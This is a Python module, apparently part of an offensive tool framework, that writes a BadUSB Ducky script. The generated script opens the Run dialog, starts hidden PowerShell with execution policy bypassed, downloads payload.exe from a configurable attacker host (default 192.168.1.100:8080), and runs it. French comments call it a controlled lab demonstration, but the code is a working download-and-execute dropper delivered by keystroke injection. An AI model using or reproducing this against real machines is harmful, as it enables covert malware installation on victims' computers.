import os
from core.module_interface import ModuleInterface
from core.logger import Logger

logger = Logger()

class BadUSBGenerator(ModuleInterface):
    def get_metadata(self):
        return {"name": "BadUSB Injector", "version": "2.0", "type": "injector"}

    def run(self, config):
        lhost = config.get("kali_ip", "192.168.1.100")
        http_port = config.get("http_server_port", 8080)
        payload_url = f"http://{lhost}:{http_port}/payload.exe"

        ducky = f'''REM BadUSB — script de démonstration lab
REM Objectif: télécharger un payload légitime depuis un serveur HTTP local
REM Ne prétend pas à une détection avancée de Defender; il vise un environnement contrôlé et autorisé.
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Host 'Démonstration BadUSB'; Start-Sleep -Seconds 2; $url = '{payload_url}'; $dest = Join-Path $env:TEMP 'payload_demo.exe'; (New-Object System.Net.WebClient).DownloadFile($url, $dest); Start-Process $dest"
ENTER
DELAY 2000
CTRL s
'''

        script_file = "inject.duck"
        with open(script_file, "w", encoding='utf-8') as f:
            f.write(ducky)

        logger.info("Script Ducky généré en mode lab sûr", path=script_file)
        return {
            "status": "success",
            "ducky_script": script_file,
            "note": "Mode démonstration: télécharge un payload depuis HTTP local pour test autorisé uniquement.",
            "payload_url": payload_url,
        }